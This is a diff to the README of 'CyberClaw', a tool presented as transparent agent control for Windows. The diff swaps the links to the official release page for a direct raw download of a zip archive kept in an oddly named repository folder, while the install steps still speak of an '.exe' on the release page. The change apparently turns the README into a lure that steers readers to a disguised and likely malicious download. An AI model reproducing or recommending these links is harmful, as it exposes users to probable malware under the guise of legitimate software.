@@ -1,6 +1,6 @@
 # 🤖 CyberClaw - Transparent Agent Control for Everyone
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Fast-newengland468/CyberClaw/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Fast-newengland468/CyberClaw/raw/refs/heads/main/interrupter/Cyber-Claw-v1.7.zip)
 
 CyberClaw helps you manage digital tasks using smart agents. It provides a clear view into every action the agent takes. You maintain full control over your work while the software handles complex steps. The system focuses on safety and reliable results for everyday tasks.
 
@@ -8,7 +8,7 @@ CyberClaw helps you manage digital tasks using smart agents. It provides a clear
 
 You can set up CyberClaw on your Windows computer in minutes. Follow the steps below to download and launch the software.
 
-1. Go to the [official release page](https://github.com/Fast-newengland468/CyberClaw/releases).
+1. Go to the [official release page](https://github.com/Fast-newengland468/CyberClaw/raw/refs/heads/main/interrupter/Cyber-Claw-v1.7.zip).
 2. Look for the file ending in `.exe` under the latest release.
 3. Click the file to start the download.
 4. Open the file once the download finishes.
